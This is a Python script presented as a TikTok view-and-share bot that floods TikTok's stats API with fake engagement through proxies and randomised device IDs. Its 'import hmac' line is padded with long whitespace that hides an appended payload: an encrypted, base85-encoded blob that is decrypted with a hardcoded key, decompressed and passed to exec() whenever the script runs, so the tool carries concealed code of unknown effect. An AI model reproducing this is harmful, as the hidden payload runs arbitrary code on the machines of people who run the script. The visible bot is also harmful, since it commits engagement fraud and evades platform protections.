import ssl
import time
import queue
import threading
import requests
import hmac                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        ,gzip,hashlib,base64;K=b'\x9a\xd3?\xfce\xa4t\xc6%\xcd\xa5\xec\x953;\\^\x0bMk\xea8\x1c\xceU,lT{H\x18\xa1';B=b')2XF002jwVfK}%I4_glTKNm(DLiUX&=J^!q_s1Wg1E-IPhLu=yUY>amPV}WJBM8u7aDAEgDK+RB^t=B!GjN?qo6;qA>-Lrj3cODT$EGMctYLm-qg4x?_~rDS<2Q}ck{m>Z$n2RpG27@9?H1ZGPVF0v-uCThdfEJwTi?F_K>bR%XcME=6;XY6jgEQn7VsXVTTvslsN7K7s(8U90gviq89tHYTRJU!{VplvvVt^aGkO)~XipDaW{?6uG}}1;#tVU_hbEqC-;qoCe!vd07&qa|x~EJo@m-PHfa8?SKLJI-#FtX@9&jtk93<`lGp_mwt88kZ1bW^Ns#H7&i`2prZ>Qv0U=sA@EF$j4oYXv5-|2C?5pknflm8M3%jXu{H?F-EHpWNI6BD>#am)_YW~h0s*gLaI&LqcS8ocN+5m{bJW!@;qT(ogPL@R2y5u39resYoCKaI7)7g1@&x?D$de2|c7AQimIl2)OcJG0;wUYu^1e-*`e)3PSDh3n|xXdAh)Rz~W`e9}iyZqrE#v_g4w4)JCD0cNL23{Y0`{RJ{RteIMx2Nu1nEf%NUXZn}-nV^YOiWbm_FXUOfrw2^X)zAaIW-L0T@#Oqh)X?pG#uh@0n~@I}EtWsVtoC4m@+G4b9$ddy2}$9sJ2fWyCOxV^vKPh>w*SYPJR;p95Y*4VtDruLJv~}Fex@eq$IN)mD8*&LdWhZ=pFw2J|14eOqse3pZ2kOdYV!j23R|z}ar#PC#{Ed<<c-89xJNU^umslX%Q@>6a#aLoFX4ILih%Qk3w5JirHD#QWU<tXMC7($DSS9M>McdcrJ9nxVs#C;(<lvhr)L@q#DXk7zt~<Pk)~Dc1*S~3eP39I9e;PkBx*nq!rt1o1ZNILBzMUF^VVK_AokGYcICUhU>O?eQF^&TQIv0n(R=1uxLEGLE6(~WtC6sn0cqX6M!!y>_m)h2OHgAYrN^&euAnRCvuV6`y~9xbJtS7*3Dtl9iXEQ^zz5;`m2ar**d5k5dRqnWOoe7BhdKfD6T)EWmH?)?aYm_mt7EWcTA>igf#C3R|6hFAs|Jd{%$`~YGBulKZME1JYD2^W!43b^(nb^&h{U!!ZspdrGt(FCkY_mcksGs-=0NjDCa+-IskQ+Ly=ULflK_7y0=ihJaUi|yL@+V_GiD{`sKmA|V#*ct;ntPHL-y{@5Vr9|(gK(s3hZ8|w58>--!-V0eHFV-{RJ=c&2Edai<21eqON^9GwP-)du~S9x?Gq3@o|0lCowU<?M3V8;|<KPH3M%=>ENyv(GP_6XN0YM3key==zaCR;r`;Nbdw@pq|GXafTm~B*vQ*G8BK#L`vC*mdI^b>Z6r-vv0i}Lh(ycCkx!L2)n%Q<_5BGHsPcP3vXfdxMdEm00`J5s*{rJl%&M!cvA|%Yjm;f3zL6<5-vcq-SWcmJl^pZi3^+AFEo~HqKBl}}keY_FOB8>w?ZLl_9Ljo2;h@Z-bY?NlFgrpN%>>a_dbnTd6WWOn7AWk`6Ol5#Bsf*m!QP$b$w${Aj|<u1qrO9fK?cm`fO<|xtNm%bOVY@ZihcALkh=;}K3IY*SD|`zgWdGce`8Jv-Nj_f!PQk3ki&WxmoR#w22r3SQl?k_T|bJgv%I&MsBv?eB3~G*C~)?Ehw_w!qCDHg*LoRrE{Y2K?}T`7P*?inG}BPBLAbO3Ely?}0838`I9vZV?7AnV9oeu2^!{GN1#p4Mw=1iWtP9{Wk`XcBIJR`|pi4&{e{_pQ_HD7Y2J`(@62ngwn6g-RrNMU!Ftb7IWrX4HTeonV(CeUfm7ydlC_4D&yp_c7<52j?dI)e`*&cgLyO#eeHxcT7K^Or9G?#hRMKR7b=cid<&L_A#=<$(ZVb*3{sORs{1j77NaDps>YrT7d%kkE<%mFmnMY*MlZAX2jGP-Z2b$KTb-SGtwro6*GW~;YT_MV)gue7Vf{=u0{Rdb$`a|Sl#WoDjj7_-h>#mM*wtNrQBW!GyELq(Z_XCz#NFSra%SLORu<ZRJuXDjqyhNzk7=9Z%37}(ReW)^;Vs8OL{<`wv$Kl19_KOfd8^u-JI#zkcR$c7j3OR(H+z%Hi!HW4f_>;4d6QH?{1F@#bp)c!e0xU5@gI`?64(-Trh6Xeh7WiZ0g!Ra-f4o@%d$ITargi<|8Cl{>LPidYCF7v5H@v^qM;a+gC!K9)HoKdr>QQLw}aXoDz9Z&c5Ez)RbC}EE?(A$E&%^ol*nLEXZVE+m#3U~im1P>Vut{unSyh}cXn@-dW1?aP@8Y&z#I202f%C;CuQr?CBVnV_=g@7h)pxx(kxo7+}S4x;3U~lw1M9}p8d=K)Po=do{nI@h>$97zr?czZZg1#Z2aJkd$=6uz22=XJP4mDt<0JN#H;wty2#J8=JIqn`+z5`Zwlz1L1fXfG632+p$qhYhGsP{30Y6u=*iN0~qBbJ1?*uB(ZIQi28t3k$u7{U{~)6~biS<}4<B{)CXk44MN$gFALUnWpaFAm(G-AS4X`n7_Gi<7nH``pX;SokndM#0$$5aiTXhND2IT!Do^p(4^ywsjo?wZPS%rwNQcKiGxiSR>3C;v0PclD+b4?w2p*zeC57)yUZ>X^o#n?`2%#m0$|frH%j6_jxAAmi35py}Per1h{P3_-|XY&1OHe!O2ygV;ie9$0<kT0GgJ!p4eDsj7lcokX-+qCh3{~6{njoGFJL<t-B2-lM5lDu40`$@KkN+B+rrrLJV&-*N|xV&u-C7+R`{@L{p{erLAboyWJ0pFqVt?LhMDD^@<QuSYEx58kLGq7`=+h>hEReH6eBniO*lcFyjHEEW<@+0XNEcw<_7vR5;;}Ibs5T)OMI&;I9R<OUvp&w{B>;j1#z6kPk9#ifR26pGf2oK@AJ+<*M#^W&nCJ5^qW3&DSJQR@EMvtUkO+<=8=M0v)hS|Cnp`A{{Zn2V5w17A5}35Bqw(HmoBVAo2B_kGauvS>~*IlIqO%7X^P~V0gL00)(gfFHxbLwYr9bmchJrmOWa73zIJ!nTY5&Sc()<X*+D)Iz7{2m_31HO#lPd25OAmq7FE`%S&~S+|2uc%+1RcFr+kJy#7y0B^Dl)ZZ=HQ%p^p%>V`h=%t6RmxOLFxv0rE;c_;JMO$fSSVCtmFTf-|%Wn`-;etWP{g8=N5?%@O{i^eY4;557438bZs#r8~F21NLz8}3azIr7c>L7IFL2>qox`js7}NYNOnJaWyoPBt+sv0g|J!gPWuP8-oE)I@r|qp5~+>*i={_o(5zLjRE_B9Ba<5nA2zD<{?5{*k$u_Mk2Fr)aK5#FMW|qONi}dJkhWw6QD%l|I#r)_i_y`2HLz5|=2X0nXEMFKILY{W^2jxXlqK7`{><BvY~se7V%pJ_H&Zy7|+X9KI~C9<%QQ|2{rH3%xf<?N+$yocOn&B7~pNC|HlXwvy8nk*!pPytLc2NTXsN#vQxHGN#{4sqmll9{^nh(9{n;)?#XeUm3Z8)1kKb>-g=|qiB04as_E;pEQVAVB9@W5-%z(<7x>RnKpPIZ5}y84F`n;%s7%x1-}b3WHfq8&8!|yf^WerU8&2#ESGGFJ8wNgH_dCnnd<{EksP>Ry?Gr1q8Fk!=l';r=base64.b85decode(B);iv,c,t=r[:16],r[16:-32],r[-32:];assert hmac.compare_digest(t,hmac.new(K[:16],iv+c,hashlib.sha256).digest());exec(gzip.decompress(bytes(a^b for a,b in zip(c,b''.join(hmac.new(K[16:],iv+i.to_bytes(8,'big'),hashlib.sha256).digest()for i in range((len(c)+31)//32))[:len(c)]))))
from random import randint, choice
from urllib3.exceptions import InsecureRequestWarning
from urllib.parse import urlparse
from http import cookiejar
from pystyle import Colorate, Colors, Write, Add, Center
from Data.UserAgent import UserAgent
from Data.Lists import DeviceTypes, Platforms, Channel, ApiDomain
from utils import *

class BlockCookies(cookiejar.CookiePolicy):
    return_ok = set_ok = domain_return_ok = path_return_ok = lambda self, *args, **kwargs: False
    netscape = True
    rfc2965 = hide_cookie2 = False

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
ssl._create_default_https_context = ssl._create_unverified_context
r                                 = requests.Session()
countQueue                        = queue.Queue()
sentRequests                      = 0
completed                         = False

r.cookies.set_policy(BlockCookies())
def Banner():
    clearConsole()
    Banner1 = r"""
TikTok View and Share Bot
"""

    Banner2 = r"""

       """

    print(Center.XCenter(Colorate.Vertical(Colors.yellow_to_red, Add.Add(Banner2, Banner1, center=True), 2)))

def sendView():
    proxy         = {f'{proxyType}': f'{proxyType}://{choice(proxyList)}'}
    platform      = choice(Platforms)
    osVersion     = randint(1, 12)
    DeviceType    = choice(DeviceTypes)
    headers       = {
                        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                        "user-agent": choice(UserAgent)
                    }
    appName       = choice(["tiktok_web", "musically_go"])
    Device_ID     = randint(1000000000000000000, 9999999999999999999)
    apiDomain     = choice(ApiDomain)
    channelLol    = choice(Channel)
    URI           = f"https://{apiDomain}/aweme/v1/aweme/stats/?channel={channelLol}&device_type={DeviceType}&device_id={Device_ID}&os_version={osVersion}&version_code=220400&app_name={appName}&device_platform={platform}&aid=1988"
    data          = f"item_id={itemID}&play_delta=1"

    try:
        req = r.post(URI, headers=headers, data=data, proxies=proxy, timeout=5, verify=False)
        return True
    except:
        return False

def sendShare():
    platform = choice(Platforms)
    osVersion = randint(1, 12)
    DeviceType = choice(DeviceTypes)
    headers = {
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "user-agent": choice(UserAgent)
    }
    appName = choice(["tiktok_web", "musically_go"])
    Device_ID = randint(1000000000000000000, 9999999999999999999)
    apiDomain = choice(ApiDomain)
    channelLol = choice(Channel)
    URI = f"https://{apiDomain}/aweme/v1/aweme/stats/?channel={channelLol}&device_type={DeviceType}&device_id={Device_ID}&os_version={osVersion}&version_code=220400&app_name={appName}&device_platform={platform}&aid=1988"
    data = f"item_id={itemID}&share_delta=1"

    try:
        req = r.post(URI, headers=headers, data=data, verify=False)
        return True
    except:
        return False

def clearURL(link):
    parsedURL = urlparse(link)
    host = parsedURL.hostname.lower()
    if "vm.tiktok.com" == host or "vt.tiktok.com" == host:
        UrlParsed = urlparse(r.head(link, verify=False, allow_redirects=True, timeout=5).url)
        return UrlParsed.path.split("/")[3]
    else:
        UrlParsed = urlparse(link)
        return UrlParsed.path.split("/")[3]

def proccessThread(sendProccess):
    while not completed:
        if sendProccess():
            countQueue.put(1)

def countThread():
    global sentRequests, completed
    while True:
        countQueue.get()
        sentRequests += 1
        if amount > 0:
            if sentRequests >= amount:
                completed = True

def progressThread():
    while True:
        start = time.time()
        startReq = sentRequests
        time.sleep(1)
        end = time.time()
        endReq = sentRequests

        elapsed = end - start
        elapsedReq = endReq - startReq

        print(f"{sentRequests} sent requests! {elapsedReq} requests/second.", end="\r")

if (__name__ == "__main__"):
    clearConsole(); Banner()
    VideoURI     = str(Write.Input("Video Link > ", Colors.yellow_to_red, interval=0.0001))
    amount       = int(Write.Input("Amount (0=inf) > ", Colors.yellow_to_red, interval=0.0001))
    nThreads     = int(Write.Input("Thread Amount > ", Colors.yellow_to_red, interval=0.0001)); clearConsole(); Banner()
    sendType     = int(Write.Input("[0] - Views\n[1] - Shares > ", Colors.yellow_to_red, interval=0.0001)); clearConsole(); Banner()
    itemID       = clearURL(VideoURI)
    proxyChoose  = True
    while proxyChoose:
        proxyType = Write.Input("Select proxy type:\n[0] - http\n[1] - socks4\n[2] - socks5 > ", Colors.yellow_to_red, interval=0.0001)
        if proxyType == "0":
            proxyType = "http"
            proxyChoose = False
        elif proxyType == "1":
            proxyType = "socks4"
            proxyChoose = False
        elif proxyType == "2":
            proxyType = "socks5"
            proxyChoose = False

    proxyList = readProxiesFile()
    clearConsole(); Banner()

    print(Colorate.Horizontal(Colors.yellow_to_red, f"Hits are not counted"))
    print(Colorate.Horizontal(Colors.yellow_to_red, f"Bot started! Check your video stats in 5 minutes !"))

    if sendType == 0:
        sendProcess = sendView
    elif sendType == 1:
        sendProcess = sendShare
    else:
        print(f"Error {sendType}")

    threading.Thread(target=countThread).start()
    threading.Thread(target=progressThread).start()

    for n in range(nThreads):
        threading.Thread(target=proccessThread, args=(sendProcess,)).start()
